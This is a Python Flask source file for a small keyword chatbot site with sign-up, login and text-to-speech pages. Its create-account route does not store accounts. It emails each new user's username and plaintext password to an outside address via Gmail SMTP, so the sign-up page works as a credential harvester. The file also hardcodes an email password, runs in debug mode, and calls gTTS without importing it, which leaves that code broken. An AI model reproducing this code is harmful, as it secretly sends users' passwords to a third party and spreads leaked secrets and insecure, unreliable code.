from flask import Flask, render_template, request, jsonify, send_file, redirect, url_for
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import os
import random

# Initialize Flask app
app = Flask(__name__)

# Your email credentials (Replace these with your actual details)
EMAIL_ADDRESS = 'sidraaiteam300@gmail.com'
EMAIL_PASSWORD = 'SIDRAAI3000'

# English responses dictionary for chatbot
responses = {
    "hello": ["Hello!", "Hi there!", "Hey! How can I help you today?"],
    "how are you": ["I'm just a bot, but I'm doing great! How about you?", "I'm fine, thank you!"],
    "help": ["Sure! What do you need help with?", "I'm here to assist you."],
    "bye": ["Goodbye! Have a great day!", "See you later!", "Take care!"],
    "thank you": ["You're welcome!", "No problem at all!", "Happy to help!"],
    "i am fine": ["Good to hear!", "Great man!", "May god bless you!"]
}

# Function to get a chatbot response
def get_chatbot_response(user_input):
    user_input = user_input.lower().strip()
    if any(word in user_input for word in responses.keys()):
        return random.choice(responses.get(user_input.lower(), ["Sorry, I didn't understand that."]))
    return "Sorry, I didn't understand that."

# Function to make the chatbot speak using gTTS (Google Text-to-Speech)
def speak(text, language="en"):
    try:
        # Generate speech with Google TTS
        tts = gTTS(text=text, lang=language)
        tts.save("response.mp3")  # Save the speech as an MP3 file
    except Exception as e:
        print(f"Error in TTS: {e}")
        return "Sorry, I couldn't speak the response at the moment."

# Route for the Create Account page
@app.route('/create_account', methods=['GET', 'POST'])
def create_account():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        # Send credentials to email
        send_to_email(f"New Account Created!\nUsername: {username}\nPassword: {password}")
        # Redirect to login page
        return redirect(url_for('login'))
    return render_template('create_account.html')

# Route for the Login page
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        # Handle login logic here (e.g., check if username and password match)
        return "Logged in successfully!"  # You can redirect or show a success message
    return render_template('login.html')

# Route for the chatbot interaction
@app.route('/chat', methods=['POST'])
def chat():
    user_input = request.json.get('message')
    response = get_chatbot_response(user_input)
    return jsonify({'response': response})

# Route to serve the audio file for text-to-speech
@app.route('/speak', methods=['GET'])
def speak_text():
    text = request.args.get('text', '')
    language = request.args.get('language', 'en')

    try:
        # Save the MP3 in a temporary file
        tts = gTTS(text=text, lang=language)
        temp_mp3_path = "response.mp3"
        tts.save(temp_mp3_path)

        # Serve the MP3 file as a response
        return send_file(temp_mp3_path, mimetype='audio/mpeg', as_attachment=False)
    except Exception as e:
        print(f"Error in TTS: {e}")
        return jsonify({"error": "Sorry, I couldn't generate the audio."})

# Function to send data to email
def send_to_email(message):
    try:
        # Create the email message
        msg = MIMEMultipart()
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = 'sidraaiteam300@example.com'  # Your work email address
        msg['Subject'] = 'New User Credentials'

        msg.attach(MIMEText(message, 'plain'))

        # Set up the SMTP server
        server = smtplib.SMTP('smtp.gmail.com', 587)  # Change if you're using a different provider
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)

        # Send the email
        server.sendmail(EMAIL_ADDRESS, 'sidraaiteam300@example.com', msg.as_string())
        server.quit()
        print("Email sent successfully!")
    except Exception as e:
        print(f"Failed to send email. Error: {e}")

# HTML Template for Create Account (create_account.html)
create_account_html = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Create Account</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f7f6;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .form-container {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            width: 300px;
        }
        h2 {
            text-align: center;
            color: #333;
        }
        label {
            margin-bottom: 5px;
            color: #555;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
            border: 1px solid #ccc;
        }
        button {
            background-color: #4CAF50;
            color: white;
            padding: 10px;
            border: none;
            width: 100%;
            cursor: pointer;
            border-radius: 5px;
        }
        button:hover {
            background-color: #45a049;
        }
        .bottom-link {
            text-align: center;
            margin-top: 10px;
        }
        .bottom-link a {
            color: #4CAF50;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="form-container">
        <h2>Create Account</h2>
        <form method="POST">
            <label for="username">Username:</label>
            <input type="text" id="username" name="username" required>
            <label for="password">Password:</label>
            <input type="password" id="password" name="password" required>
            <button type="submit">Create Account</button>
        </form>
        <div class="bottom-link">
            <p>Are you a current user? <a href="/login">Login here</a></p>
        </div>
    </div>
</body>
</html>
"""

# HTML Template for Login Page (login.html)
login_html = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f7f6;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .form-container {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            width: 300px;
        }
        h2 {
            text-align: center;
            color: #333;
        }
        label {
            margin-bottom: 5px;
            color: #555;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
            border: 1px solid #ccc;
        }
        button {
            background-color: #4CAF50;
            color: white;
            padding: 10px;
            border: none;
            width: 100%;
            cursor: pointer;
            border-radius: 5px;
        }
        button:hover {
            background-color: #45a049;
        }
        .bottom-link {
            text-align: center;
            margin-top: 10px;
        }
        .bottom-link a {
            color: #4CAF50;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="form-container">
        <h2>Login</h2>
        <form method="POST">
            <label for="username">Username:</label>
            <input type="text" id="username" name="username" required>
            <label for="password">Password:</label>
            <input type="password" id="password" name="password" required>
            <button type="submit">Login</button>
        </form>
        <div class="bottom-link">
            <p>Don't have an account? <a href="/create_account">Create an account</a></p>
        </div>
    </div>
</body>
</html>
"""

# Main Route to serve the chatbot page (home page)
@app.route('/')
def home():
    return render_template('chat.html')

# HTML Template for Chatbot Interface (chat.html)
html_template = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chatbot</title>
    <style>
        /* Basic Styles */
        body, html {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
        }

        /* Chat container */
        .chat-container {
            width: 100%;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: flex-end;
            background-color: #f0f0f0;
        }

        .chat-box {
            flex-grow: 1;
            padding: 10px;
            overflow-y: scroll;
            max-height: 80%;
            background-color: white;
        }

        .input-container {
            display: flex;
            padding: 10px;
            background-color: #fff;
        }

        #user-input {
            flex-grow: 1;
            padding: 10px;
            border-radius: 5px;
        }

        button {
            background-color: #4CAF50;
            color: white;
            padding: 10px;
            border: none;
            cursor: pointer;
            border-radius: 5px;
        }

        button:hover {
            background-color: #45a049;
        }

        .chat-message {
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
        }

        .user-message {
            background-color: #e1ffc7;
            text-align: right;
        }

        .bot-message {
            background-color: #f1f1f1;
            text-align: left;
        }
    </style>
</head>
<body>
    <div class="chat-container">
        <div class="chat-box" id="chat-box"></div>
        <div class="input-container">
            <input type="text" id="user-input" placeholder="Type a message..." oninput="checkInput()" />
            <button id="send-btn" onclick="sendMessage()" disabled>Send</button>
        </div>
    </div>

    <script>
        const chatBox = document.getElementById('chat-box');
        const userInput = document.getElementById('user-input');
        const sendBtn = document.getElementById('send-btn');

        // Function to check if user input is not empty
        function checkInput() {
            sendBtn.disabled = userInput.value.trim() === '';
        }

        // Function to send a message
        async function sendMessage() {
            const userMessage = userInput.value.trim();
            if (userMessage === '') return;

            // Display user message
            addMessage(userMessage, 'user');
            userInput.value = '';
            checkInput();

            // Get bot response
            const response = await getChatbotResponse(userMessage);
            addMessage(response, 'bot');

            // Scroll to the bottom
            chatBox.scrollTop = chatBox.scrollHeight;
        }

        // Function to get chatbot response
        async function getChatbotResponse(userMessage) {
            const response = await fetch('/chat', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ message: userMessage })
            });
            const data = await response.json();
            return data.response;
        }

        // Function to add a message to the chat
        function addMessage(message, sender) {
            const messageElement = document.createElement('div');
            messageElement.classList.add('chat-message', sender === 'user' ? 'user-message' : 'bot-message');
            messageElement.textContent = message;
            chatBox.appendChild(messageElement);
        }
    </script>
</body>
</html>
"""

# Run the Flask application
if __name__ == '__main__':
    app.run(debug=True)